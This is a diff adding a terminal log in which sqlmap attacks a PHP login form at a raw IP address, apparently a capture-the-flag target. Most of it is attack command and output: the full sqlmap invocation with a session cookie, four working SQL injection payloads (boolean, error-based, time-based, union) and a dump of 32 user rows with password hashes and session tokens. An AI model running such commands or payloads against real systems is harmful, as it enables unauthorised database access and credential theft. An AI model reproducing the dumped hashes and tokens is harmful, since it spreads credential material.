@@ -1,0 +1,83 @@
+viviturtle@vivi-laptop:~$ sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d' -p username -D TopSecret -T users --dump
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150919}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 18:39:00
+
+[18:39:01] [INFO] resuming back-end DBMS 'mysql' 
+[18:39:01] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=test' AND 7074=7074 AND 'UonP'='UonP
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=test' AND (SELECT 7296 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(7296=7296,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'DRrf'='DRrf
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=test' AND (SELECT * FROM (SELECT(SLEEP(5)))XSaB) AND 'wzNJ'='wzNJ
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: username=test' UNION ALL SELECT CONCAT(0x71717a6271,0x4f72664d694671504f4f,0x7176627071),NULL-- 
+---
+[18:39:01] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL 5.0
+[18:39:01] [INFO] fetching columns for table 'users' in database 'TopSecret'
+[18:39:01] [INFO] fetching entries for table 'users' in database 'TopSecret'
+[18:39:01] [INFO] analyzing table dump for possible password hashes
+Database: TopSecret
+Table: users
+[32 entries]
++----+-------+--------------------+----------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+
+| id | admin | username           | password                                                                                                                         | session                                                                                                                          |
++----+-------+--------------------+----------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+
+| 1  | 0     | admin              | 0cc8ad13e3adc57abde1fcb81ae3c9896be04eb27a1411988475cedea5ac6553473de16afaf71c2a546f6bd868b859d6ef1cd065abd6f92e75e22aa4bfecce0a | 3f44e5dedf6b06b5da8c6e5ec7c0f4304f334a2ff2b1da3654942bab969e89765dae32faeabefdc0cf15d506c5146d96289dfa9929af7f60d65055d978e406ec |
+| 2  | 0     | dad                | 2d5ca061b638b0d44e337ed5b6ae1eccee72e20794fa98d294b779d65126bd710103a9df137dc4a495fd3059c7ffbc12b7968b49d1a008b9ca860372507a8670 | 3aa746aaed1989910fc64e8bbf6cfa47ca954caa7552b26519fc06c42bf13694e561655ffe2c4b9cee1bddd3771658bd54d7cab82ff807a8619143ae61c562b2 |
+| 3  | 0     | asdf               | ce57d8bc990447c7ec35557040756db2a9ff7cdab53911f3c7995bc6bf3572cda8c94fa53789e523a680de9921c067f6717e79426df467185fc7a6dbec4b2d57 | 0a17137c74e6f2ecf86d9920972d10bbc71fde1d99d03864989dcf7406e3f9f7750fb3751d3f497a24fb29ffcda05fba8af48cfd52c1f204f109bc075cb4fe34 |
+| 4  | 0     | test               | 560b30a00786abd7c6fb7219dabe7cfc53c9fb952c31719193c16d2d3582164e64b9b11381c49e3cfb6195375f496610dbe09204c2c8bf0486fece673ef24e8d | 4b93ae5ce91b55137b3a753df6b837f3733954e09483e4da06dfe840ce907c0daa72258f42d423a8effaffd66eeb67718bb223164a0c2dbfabb0526f21168e4b |
+| 5  | 0     | sebel              | 14d7ac097e778171e5fc12db92b1b1b328cccd8d2e85f64b73b4d7c8e7b6925c1f84169116012ee791e2a377dcd768022e7583dcf1602393da57e489fa807314 | ec6098bd7b7adedf4a5386264a588b6773f1124517ed65febfb27b8b62377140f39b6715987489ef2ff46e8a9e4238ae290628dd77a4ee6cbc0b21473d6dd973 |
+| 6  | 0     | alargerottingpenis | 291eef8c8b7038d6d28ec6f33e2e80313404b8b4cc6c115185162b4f92679255841a12847aed4efbd0ba752dcbab52d4db0b6941a8ae807d6b74dc7edf14f5c7 | de49dd968ecbc775cd70d9dabaaf3a8738079ed00832806397075838d4688e199bdf02438f373af7879458d72a6321865f60d6f88239738b2629f50281d61c56 |
+| 7  | 0     | sophia d'antoine   | b96269f2d158ff68233d8380427b86ac523ea6473b918e86dd6d98874f274ffc047798c7bc1c46df4fb20598bbadfc2b777e8aab93e2ba37fcfcb456e6ec4fe7 | 0fd03a73998e86982cd1651bf670a6229a3f8df3a8c5fedae19cd18ee88890b068aadbb0230f87357d0177cfb95a6682777caac388f4b2f78fb634ab02b37e8e |
+| 8  | 0     | gwen               | 3c16b5a6f6e4307bbf1f74eb95c5584288a541aa3a82775b342aedd1ec6a7f1b3267c245e791f181c2f2ee232dc642ed4e48ec16ae8d469c49fd5544e656d618 | c3664a22b5a60be6a21d9e11b2a8cda5b1eb613f4dbb4981eea39b213f00073d99285168b759e8d263434d12fa2d68665a7ba2e10fa36ed5a8caa1c52dee33e1 |
+| 9  | 0     | asf                | 5cdc552e7ceeacb5156628beb1832b18aa01a80c636d35323967b39d735dedf6d0b5d04d988685fd42dc588936b7b69346225bb20bb8f2b1f739ed29ecf5cdb6 | 684dad5a97b829cecb521fb1fcd6ba63489849f6645f5b24cd0ac91552a0023befc17e86fd3bd1ad6106cee44e9342f772852e6f051b6c081b3fb3cb759d916c |
+| 10 | 0     | me                 | a8d5562e2c8f95053bb410a1fe18f88859b7df4c82ca41b25c0bcb9508004181c243f0756ea860d6d957e397f2bedfcbddd396cb6c7c2a2b5b9c59cae02c80ce | 6f7f611cb6c8a3dcd7abdb09ecfa4b18ea78810e5054b991bdb98823db02d456fbeca03d03ddb76962ff235ffeb0b43b7dbb7f7a206a334d58c320c967c78da9 |
+| 11 | 0     | not spohia         | dca9e7a65726b400680cde2fc7d59a7959385c78b9dc8bd827f193fc6240ff29526e373e3527077b7ad945ac0c9f13a01231c557b5c51354dde22164bb7a7435 | 8b9ec4212bd26067e896db420d0a6e9ed40e0214a3654aca50bf12e5fad0ec111179b6f7a7da1a9530ba763dd76bdd746e2efcff72220301945d549047f79553 |
+| 12 | 0     | hello              | c1d215a922ad186acbe436e6e2c513128b0aaa23ed6e3a4d48140b4931895384bc5b8074b7ef6b1a3e2a65b5be0c875871fec6e1a38f9c3df35c208abd4e16f2 | 88871ef9d8b5f3b1238c77cc60faad7c4d7b8a6adee3d83b6467b48c93d6999bfe85cfc0da3489d8fdf936b0397dab21e6704cbe1654ff1c52a2d85fb9be7eff |
+| 13 | 0     | '; or 1=1 --       | e431f5b67cb8a9d7446ba6aeeed15196a19981d556195da30fc1cc10d03a6d096852244858beced885181496ec25a731bb78f89bae059265ab1cfc086dd843ab | 8bdd7767a357909ba91b3a23d1f7affce4084e64fc167b22895d103ff48966523abc081f6f1c0f0455bcfe8a8137569e27e090f6323c1fa9fd3dad5278df1c04 |
+| 14 | 0     | nma                | 53c7681687d2cf311ad8aec92473a74894b4644b2a91c11cd97a6c688ba6043d9f1f7ae69a6acf11e10cb5ae17a5063a5448ac544b3d8505a6bd70314310e186 | c52a96269d9f683ee804653d42e16a484fbff4678eaa2719070339e471f08c116bfe9ee908b4ae4928182b207cff929e9e00e23b118304dfc5e3af0e363a0d4a |
+| 15 | 0     | ' or '1'='1';--    | ae221d6e54fcbb0127fb14fff328a936524b4313018e28d9f05f1eb8b86bd53b6fb6714f68a7db5df047f04b391ac93bc2cfc69fc5a0ed7c245b43e2e42cbee5 | 3a4b4c53ea60e6a4d72a380c465a7a0ed0c3b786571f434f44b732ee3b90e78dde9744c338833f615cd9554821c5bb6cf2b53d070dadcd62fcf2341b38669258 |
+| 16 | 0     | your real dad      | a87d98305e3d198d550aacf7ac1f9f156640f67987252f81baf8859eb22692098087f3cd45aa9908b45f4c70ee61fc99909d121598bcb3a620bb6d0414603336 | c20630a8f5a2035061598f4e3084608822b7798ee2d3a7f02c7f0d70c49ef3a21294acb1ca0e9f07b70a4794aab36a3e767063aab6d78338d8bf60d231b20742 |
+| 17 | 0     | a                  | f6c5600ed1dbdcfdf829081f5417dccbbd2b9288e0b427e65c8cf67e274b69009cd142475e15304f599f429f260a661b5df4de26746459a3cef7f32006e5d1c1 | 77fe5fac249214b5d53712e6450ca4858752285b7e6e7eee10bea7fa2d7a6a67b7a29c9ceb00797c222676914e54261b3679b5babde47f92df40d6d264531613 |
+| 18 | 0     | mns                | 6ba67f8b2020cc139adda4706eb2abd6c85f806d21086efa8562c74cd2fb639a946e4e899f7fc0d5d4c1e3a010f31924dd2f29d7268559a5c88268c975264c22 | 5d8409873baa3ba966924445c092b47ebb625cba491a5692fb13058914e8aabf0ccce78405d96afda5745352874a4f7f74f043c35126baf3d8fbb5c752f2ebc6 |
+| 19 | 0     | ff                 | 84c23cc703619245d8f3f39f162b7e1747c4f48fb687ee2c178380dbabcf103e9d61c590558d418e073c972a69dd06741ec26d530020fdafd4085341a09d6ec7 | 459439e12dab18476742fab0e666e41b59119608fb17683cc7a4b93a3bc2417af5c3b53768d752cf3037e7928088413a79a0779e01986c88f778f62065c8fb4c |
+| 20 | 0     | test2              | a7e26707c61cb1e332c4dab3765458c5241d4d59b3f9d525ebb428d4da7a462f1f615fabd01a51f381c4386d2c2f75a8c275b1468729a776edd3da188c3747ae | 16f63121ac867d4707e85f5ecd50d1749e7c1653716aa3db61aebedb8f0b9ff5d0e6b9e54bff9fac5acc8f876eb0c9de73191c391ab6000cb1245c782b02f1b0 |
+| 21 | 0     | test123            | 469fbabcde3803d5131e7c50c61bbd59a962546f1d292ebaef9168156fbf76f86abe0d07203480d0aae53c038c3102923bb544fa486712184202a97f5cf73f92 | 00ff30836d596447a3267c8d0ef07c5322591482fe10bb290af1ac8ae68472956a88d33a184545343a35537e54be27cbe91b8a06eec0ecb4670cd7d0e6b0b1ee |
+| 22 | 0     | tii                | e0a163908c538c1e7bba8ba151cd79817459a731d8a46c93cb021d56d518632389bc533ab62969b8a21ad26d3fd7a8b9ed4ff04d0eca87d4a0b2aa006ec887e2 | 324e1873edcd740ac1b6db7300615ca6b26d202e7bd7c1ab6bd7ddb440d84281fb435b4c62fda6738fd6baf0d90cfa8b37822593cc23f03d5e342d5cadc4104d |
+| 23 | 0     | apples             | f80041c9faebaf63b1f832608e568396c0696f6299a826dbca7cdc1489446722e1e94ac6bdb46bf9b70cc14f93b0de86960bb634ea0edf00154052a09096c6ed | e6f1641f4aeb281f0cf7287dc4c9e6be6aee4c0901514340b51f76d406b5a7228adb4187843f80fc378434c575dd47794f4d25c7bca81659670d48533dde583f |
+| 24 | 0     | johncena           | 3ae0d0497b46f8012376405cf11aef514a733cdced4b28a041dd3a230b0c823e377e9b28df74fa355bf4ae08db883fa3ae50a69746d38bd28328d000acf27c6a | 774c9f44add28b1618aa0b6672250b79d8543c6a7b3152deda50c7a178948b4549df3526a880fb11a76408807e4c37511028710f3a8fb5ccc8cc5112f151b257 |
+| 25 | 0     | red                | c70dfc0728e24cf2980528cb6c9cf1d23c292f1eef1430cb2cbfe967543ed8788142d74d8db9724bdc05f2b7f87d50518eadbbb458f42ecb4cc406e8ade17811 | 6dc0db1578209e7e003753f90e58ec58a03d9ef79a1716a1b15c76b53f05ced39782c042abc273ef810527a66a9b682bd455c79a4e3dd3aaf4bfe786c9ef2769 |
+| 26 | 0     | flagplz            | 78d601f494fc64b38007368363a8b6661c135b3ff7d7ee5bda031b2d72e09204550a18208835300a7d2102007ea623bd576b9d036dcd39fb73ced9911abba766 | bea623ab6ec13488d62d6dd7b908e746d2ea7738cfb5059efa03e5fd03eb119fb6825337dfc179aa9fc86752bbf538800a45abde893622e87e3bed2326bc16bd |
+| 27 | 0     | iamadmin           | 4d72423779088f0cabf5a53bd1ca49d7f1a78260530992bc2983ed288bf96de8c9d1fe880653fa57560abe86478d5c46a3ecca8b5278fcb42ed4997a342a31fe | a4b881d9e7d8706a0d4928f9af39e02afc1eda922c8554a0fc7a898148e53bffd41d5720ccd6e9181992b7c60b0bdeb30a719e6bad7302e762c00f74955db66a |
+| 28 | 0     | ' or '1' = '1      | 79ced49ae35b3d29c8f365f486bdab1c3fa10a4d2a8ffff5dbb8097d7229a0681ef413849e6ba043d4764c05bc3efc71aa66c2496ead7b5e566013e758b18f4b | 9ecb295463815e6bff6ac1cf32b3afb838caaa871b57f7e7cc15712ef3f6ad42d4d7f22409c8d948d3c04b6f1bdce4a1845de3df33448d62a1fdf31e44af062e |
+| 29 | 0     | whoami             | 7c51c9e19bb1fbc7bfc95acf6f160ccc0c04bb123d183167d29c68a4434967d95fd2322524ec3d3d5e0aaf50c9ff87ac6dc5b4163fe12397dab37fdd19451190 | 2d3c3a0a07f780a6ce4621509dc3b353d6653faa419b025caa686809770b6710be37954c50994442371b6c37131ab0fa8683491c8ee8281258d4b52db2b751ca |
+| 30 | 0     | b                  | 223e46eb5bfdde72a58d8ad6ccf8eab31557de4779a64521dc69bd93b939c439e172fffbf3a53ba7b7f55155e6123b84c22ffb3fa378f999658b897f66d35d26 | 64e30ba3d624ff12b2e421d60326bf93bb64c1ccaf20c79c2d4c2531111a2d029f52f3779f005fd07b46b9434015aaf1964c6da66ce6c725834a56609ac13161 |
+| 31 | 0     | balls              | 17d2bea55ecf4404ba4b08a7280d7f3dc7c33aba2a44aad6e511c231152f6c0b4a1e534c91001b709e9b7e9d041917b0efaeaa47342c7b38ae433906e76129ed | f3b338aac5791e141a48a507679853b04325b60fbef68f7b1c54faba07c68c2ea4dbb5d2f6d6d54d4339aba42e90745a0852c3259c40428be60fcdba09a432b0 |
+| 32 | 0     | apple              | 1457f9d7cf1d6d9501504a6a4f7abaa067dc43e7f6cb49625db704ffd65447370b8bc7a41a84d7538d43ac2e1c543c2b961cf0009be480956693d23dbeeba818 | 982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d |
++----+-------+--------------------+----------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+
+
+[18:39:01] [INFO] table 'TopSecret.users' dumped to CSV file '/home/viviturtle/.sqlmap/output/162.243.171.85/dump/TopSecret/users.csv'
+[18:39:01] [INFO] fetched data logged to text files under '/home/viviturtle/.sqlmap/output/162.243.171.85'
+
+[*] shutting down at 18:39:01
